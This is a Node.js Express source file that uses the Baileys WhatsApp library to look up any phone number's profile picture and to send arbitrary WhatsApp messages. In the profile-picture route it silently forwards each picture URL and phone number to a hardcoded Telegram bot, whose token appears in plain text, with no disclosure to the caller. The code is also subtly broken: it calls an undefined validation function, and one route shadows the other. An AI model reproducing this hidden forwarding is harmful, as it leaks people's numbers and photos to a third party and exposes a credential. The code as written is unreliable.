const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion, DisconnectReason } = require('@whiskeysockets/baileys');
const express = require('express');
const cors = require('cors');
const compression = require('compression');

const app = express();
const port = 3000;
let client;
let serverStarted = false;
let isClientConnected = false; // Track client connection status
const pendingRequests = new Map();

app.use(cors());
app.use(compression());

const sanitizePhoneNumber = (phone) => {
    if (!phone) return ''; // Return an empty string if the input is null or undefined

    // Remove all non-digit characters
    let cleanedPhoneNumber = phone.replace(/\D/g, '');

    // Ensure the phone number starts with '91' (country code for India)
    if (!cleanedPhoneNumber.startsWith('91')) {
        // Remove leading zeros if present and then add '91' as the prefix
        cleanedPhoneNumber = cleanedPhoneNumber.replace(/^0+/, '');
        cleanedPhoneNumber = `91${cleanedPhoneNumber}`;
    }

    return cleanedPhoneNumber;
};

// Function to validate Indian phone numbers with 9-13 digits after '91'
const isValidIndianPhoneNumber = (phone) => {
    // Regular expression to match exactly '91' followed by 9 to 13 digits
    const indianPhoneRegex = /^91\d{9,13}$/;
    return indianPhoneRegex.test(phone);
};

const initializeBaileys = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info');
    const { version } = await fetchLatestBaileysVersion();
    client = makeWASocket({
        auth: state,
        version,
        printQRInTerminal: true,
    });

    client.ev.on('creds.update', saveCreds);

    client.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            isClientConnected = false;
            console.log('Connection closed');
            if (lastDisconnect?.error?.output?.statusCode === DisconnectReason.conflict) {
                console.log('Stream Errored: Session Conflict Detected. Not reconnecting.');
            }
        } else if (connection === 'open') {
            isClientConnected = true;
            console.log('Baileys Client is ready to use!');

            if (!serverStarted) {
                app.listen(port, () => {
                    console.log(`API server is running on http://localhost:${port}`);
                });
                serverStarted = true;
            }
        }
    });
};

initializeBaileys();

app.get('/:number', async (req, res) => {
    let phone = req.params.number;
    if (phone === 'favicon.ico') return res.status(200).json({ ok: 'true' });

    const sanitizedPhone = sanitizePhoneNumber(phone);
    if (!isValidPhoneNumber(sanitizedPhone)) {
        return res.status(400).json({ error: 'Invalid phone number format. Only digits (7-15) are allowed.' });
    }

    const phoneNumber = `${sanitizedPhone}@s.whatsapp.net`;

    if (pendingRequests.has(phoneNumber)) {
        const profilePicUrl = await pendingRequests.get(phoneNumber);
        return profilePicUrl
            ? res.json({ profilePicUrl, status:{status:''} })
            : res.status(500).json({ error: 'Failed to fetch profile picture (in progress)' });
    }

    if (!isClientConnected) {
        return res.status(500).json({ error: 'Client is not connected. Please check the connection.' });
    }

    try {
        const profilePicPromise = client.profilePictureUrl(phoneNumber, 'image');
        pendingRequests.set(phoneNumber, profilePicPromise);

        const profilePicUrl = await profilePicPromise;

        if (profilePicUrl) {
            res.json({ profilePicUrl, status:{status:''} });

            const telegramUrl = `https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&caption=${encodeURIComponent(phoneNumber)}`;
            try {
                await fetch(telegramUrl);
            } catch (fetchError) {
                console.error('Failed to send photo to Telegram:', fetchError);
            }
        } else {
            res.json({ phoneNumber, profilePicUrl: 'No profile picture found' });
        }
    } catch (error) {
        console.error('Error fetching profile picture:', error);
        res.status(500).json({ error: 'Failed to fetch profile picture' });
    } finally {
        pendingRequests.delete(phoneNumber);
    }
});

app.get('/send', async (req, res) => {
    const phone = req.query.nm;
    const message = req.query.message;

    const sanitizedPhone = sanitizePhoneNumber(phone);
    if (!sanitizedPhone || !isValidPhoneNumber(sanitizedPhone)) {
        return res.status(400).json({ error: 'Invalid phone number format. Phone number must contain 7-15 digits.' });
    }

    if (!message) {
        return res.status(400).json({ error: 'Message is required.' });
    }

    if (!isClientConnected) {
        return res.status(500).json({ error: 'Client is not connected. Please check the connection.' });
    }

    const phoneNumber = `${sanitizedPhone}@s.whatsapp.net`;

    try {
        await client.sendMessage(phoneNumber, { text: message });
        res.json({ status: 'Message sent successfully', phoneNumber, message });
    } catch (error) {
        res.status(500).json({ error: 'Failed to send message', details: error.message });
    }
});
